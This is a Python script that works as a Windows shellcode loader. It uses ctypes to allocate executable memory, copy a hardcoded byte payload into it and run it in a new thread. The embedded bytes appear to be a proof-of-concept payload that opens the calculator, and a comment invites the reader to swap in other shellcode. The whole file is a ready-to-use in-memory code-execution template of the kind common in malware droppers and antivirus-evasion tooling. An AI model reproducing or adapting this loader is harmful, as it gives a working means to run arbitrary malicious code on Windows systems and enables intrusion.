import ctypes

def execute_code():
    #change your shellcode here
    scbytes = b"\x6a\x60\x5a\x68\x63\x61\x6c\x63\x54\x59\x48\x29\xd4\x65\x48\x8b\x32\x48\x8b\x76\x18\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57\x3c\x8b\x5c\x17\x28\x8b\x74\x1f\x20\x48\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x8d\x52\x02\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xef\x8b\x74\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01\xf7\x99\xff\xd7"
    
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.CreateThread.argtypes = (
    ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int))

    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(scbytes)), ctypes.c_int(0x3000),
                                                ctypes.c_int(0x40))
    buff = (ctypes.c_char * len(scbytes)).from_buffer_copy(scbytes)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space), buff, ctypes.c_int(len(scbytes)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(space),
                                                 ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, ctypes.c_uint32(0xffffffff))